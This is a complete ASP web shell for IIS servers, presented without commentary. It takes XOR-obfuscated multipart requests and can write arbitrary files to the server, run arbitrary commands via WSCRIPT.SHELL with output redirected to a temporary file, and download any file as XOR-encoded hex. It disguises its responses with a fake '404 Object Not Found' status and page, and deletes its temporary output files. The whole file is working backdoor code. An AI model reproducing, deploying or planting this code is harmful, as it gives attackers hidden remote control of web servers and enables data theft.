<%
On Error Resume Next
Server.ScriptTimeout = 600
Response.Expires = 0
Response.Buffer = True
byteCount = Request.TotalBytes
RequestBin = Request.BinaryRead(byteCount)
Set UploadRequest = CreateObject("Scripting.Dictionary")
PosBeg = 1
PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(13)))
boundary = MidB(RequestBin,PosBeg,PosEnd-PosBeg)
boundaryPos = InstrB(1,RequestBin,boundary)
myBoundary = getString(boundary)
BuildUploadRequest RequestBin, boundary, boundaryPos
If Err.Number <> 0 then
	Response.Write "An Error occured. Error number: " & Err.Number
	Response.Write " Error description: " & Err.Description
	Response.Flush
Else
	RemoteFile = UploadRequest.Item("rf").Item("Value")
	Act = UploadRequest.Item("c").Item("Value")
	mode = UploadRequest.Item("m").Item("Value")
	value = UploadRequest.Item("blob").Item("Value")	


	myLen = LenB(boundary)
	myBXor1 = MidB(boundary,myLen-1,1)
	myBXor2 = MidB(boundary,myLen,1)
	teststring = myBXor1 & myBXor2
	iKeyChar = hstringtod(teststring)

	nact = Empty
	For g = 1 to Len(Act)
		tmp = Mid(Act,g,1)
		iChar = Asc(tmp)	
		nChr = iChar Xor iKeyChar
		nact = nact & Chr(nChr)
	Next
	rf = Empty
	For g = 1 to Len(RemoteFile)
		tmp = Mid(RemoteFile,g,1)
		iChar = Asc(tmp)	
		nChr = iChar Xor iKeyChar
		rf = rf & Chr(nChr)
	Next
	RemoteFile = rf

	If ((Asc(mode)) = 49) Then
		Response.Status = "404 Object Not Found!"
		Set ScriptObject = Server.CreateObject("Scripting.FileSystemObject")
		If Err.Number <> 0 then
			Response.Write "An Error occured. Error number: " & Err.Number
			Response.Write " Error description: " & Err.Description & " Failed Create FileSystemObject" 
			Err.Flush
		End If
		Set MyFile = ScriptObject.CreateTextFile(RemoteFile)
		If Err.Number <> 0 then
			Response.Write "An Error occured. Error number: " & Err.Number
			Response.Write " Error description: " & Err.Description & " Failed CreateTextFile " & RemoteFile 
		Else
			For z = 1 to LenB(value) Step 2
				tmp = MidB(value,z,2)
				iStringChar = hstringtod(tmp)	
				binChr = iStringChar Xor iKeyChar
				MyFile.Write Chr(binChr) 
				If Err.Number <> 0 then
					Response.Write "An Error occured. Error number: " & Err.Number
					Response.Write " Error description: " & Err.Description & " Write failed!"
					Exit For
				End If
			Next	
			MyFile.Close
	
			If Err.Number = 0 Then
				Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
				If (oFileSys.FileExists(Server.MapPath("/iishelp/common/404b.htm"))) then
					Set errFile = oFileSys.OpenTextFile(Server.MapPath("/iishelp/common/404b.htm"), 1, -2)
					errOutput = errFile.ReadAll
					If Err.Number <> 0 then
						Response.Write "An Error occured. Error number: " & Err.Number
						Response.Write " Error description: " & Err.Description
					Else
						Response.Write errOutput
						Set errFile = Nothing
					End IF
				End If
				Set oFileSys = Nothing
			End If
		End If
		Response.Flush
		Set ScriptObject = Nothing
		Set MyFile = Nothing
	End If 

	If ((Asc(mode)) = 48) Then
		SetupDownload RemoteFile, iKeyChar 
	End If
	If ((Asc(mode)) = 50) Then
		Set oScript = Server.CreateObject("WSCRIPT.SHELL")
		Call oScript.Run(nact > RemoteFile, 0, True)
		If Err.Number <> 0 then
			Response.Write "An Error occured. Error number: " & Err.Number
			Response.Write " Error description: " & Err.Description
			Response.Flush
		Else 
			SetupDownload RemoteFile, iKeyChar
		End If
		Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
		Call oFileSys.DeleteFile(RemoteFile, True)
		Set oFileSys = Nothing
		Set oScript = Nothing
	End If 
	Set UploadRequest = Nothing
End If

Function SetupDownload(filename, kChar)
	SetupDownload = TransferFile(filename,"application/octet-stream",kChar)
End Function

Function TransferFile(path, mimeType,v) 
	On Error Resume Next
	Const FILE_TRANSFER_SIZE = 16384 

	Randomize
	TransferFile = True 
   	Set objFileSystem = Server.CreateObject("Scripting.FileSystemObject") 
   	Set objFile = objFileSystem.GetFile(path) 
	Set objStream = objFile.OpenAsTextStream(1, 0) 
	Response.AddHeader "Content-Type", mimeType 
	Response.AddHeader "Content-Length", (objFile.Size * 2)
	If Err.Number <> 0 then
		Response.Write "An Error occured. Error number: " & Err.Number
		Response.Write " Error description: " & Err.Description
		Response.Flush
	   	Set objFileSystem = Nothing
   		Set objFile = Nothing
		Set objStream = Nothing 
		TransferFile = False
	Else
		meval = v
		Do While Not objStream.AtEndOfStream 
   			char = objStream.Read(1)
			hi = Asc(char) Xor meval
			If ((hi >= 0) And (hi <= 9))  Then
				Response.Write 0
				Response.Write hi
			End If
			If ((hi >= 10) And (hi <= 15))  Then
				Response.Write 0
				Response.Write Hex(hi)
			End If
			If (hi > 15) Then	
				Response.Write Hex(hi)
			End If
			sent = sent + 1 
			If (sent MOD FILE_TRANSFER_SIZE) = 0 Then
				Response.Flush 
				If Not Response.IsClientConnected Then
			            TransferFile = False 
			            Exit Do 
				End If 
	      	End If 
		Loop
		Response.Flush 
	   	Set objFileSystem = Nothing
   		Set objFile = Nothing
		Set objStream = Nothing 
		If Not Response.IsClientConnected Then TransferFile = False
	End If
End Function
%>

<%
Sub BuildUploadRequest(RequestBin, boundary, boundaryPos)
	Do until (boundaryPos=InstrB(RequestBin,boundary & getByteString("--")))
		Set UploadControl = CreateObject("Scripting.Dictionary")
		Pos = InstrB(BoundaryPos,RequestBin,getByteString("Content-Disposition"))
		Pos = InstrB(Pos,RequestBin,getByteString("name="))
		PosBeg = Pos+6
		PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(34)))
		Name = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))
		PosFile = InstrB(BoundaryPos,RequestBin,getByteString("filename="))
		PosBound = InstrB(PosEnd,RequestBin,boundary)
		If  PosFile<>0 AND (PosFile<PosBound) Then
			PosBeg = PosFile + 10
			PosEnd =  InstrB(PosBeg,RequestBin,getByteString(chr(34)))
			Pos = InstrB(PosEnd,RequestBin,getByteString("Content-Type:"))
			PosBeg = Pos+14
			PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(13)))
			ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))
			UploadControl.Add "ContentType",ContentType
			PosBeg = PosEnd+4
			PosEnd = InstrB(PosBeg,RequestBin,boundary)-2
			Value = MidB(RequestBin,PosBeg,PosEnd-PosBeg)
		Else
			Pos = InstrB(Pos,RequestBin,getByteString(chr(13)))
			PosBeg = Pos+4
			PosEnd = InstrB(PosBeg,RequestBin,boundary)-2
			Value = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))
		End If
		UploadControl.Add "Value" , Value	
		UploadRequest.Add name, UploadControl	
		BoundaryPos=InstrB(BoundaryPos+LenB(boundary),RequestBin,boundary)
	Loop
	Set UploadControl = Nothing
End Sub

Function hstringtod (myString)
	Dim leg, val
	val = 0
	length = LenB(myString)				
	myString = LCase(myString)
	For i = 1 to length
			thisval = AscB(MidB(myString,i,1))
			If (((thisval >= 48) And (thisval <= 57)) Or ((thisval >= 97) And (thisval <= 102))) then
				If ((thisval >= 97) And (thisval <= 102)) then
					If thisval = 97 Then
						thisval = 10
					End If
					If thisval = 98 Then
						thisval = 11
					End If
					If thisval = 99 Then					
						thisval = 12
					End If
					If thisval = 100 Then
						thisval = 13
					End If
					If thisval = 101 Then
						thisval = 14
					End If
					If thisval = 102 Then
						thisval = 15					
					End If
				Else
					If thisval = 48 Then
						thisval = 0
					End If
					If thisval = 49 Then
						thisval = 1
					End If
					If thisval = 50 Then
						thisval = 2
					End If
					If thisval = 51 Then
						thisval = 3
					End If
					If thisval = 52 Then
						thisval = 4
					End If
					If thisval = 53 Then
						thisval = 5
					End If	
					If thisval = 54 Then
						thisval = 6
					End If	
					If thisval = 55 Then
						thisval = 7
					End If
					If thisval = 56 Then
						thisval = 8
					End If
					If thisval = 57 Then
						thisval = 9
					End If
				End If	
			Else
				hstringtod = -1
				Exit Function
			End If
			val = val + (thisval * (16^(length-i)))
	Next
	hstringtod = val
End Function

Function getByteString(StringStr)
 For i = 1 to Len(StringStr)
 	char = Mid(StringStr,i,1)
	getByteString = getByteString & chrB(AscB(char))
 Next
End Function

Function getString(StringBin)
 getString =""
 For intCount = 1 to LenB(StringBin)
	getString = getString & chr(AscB(MidB(StringBin,intCount,1))) 
 Next
End Function

%>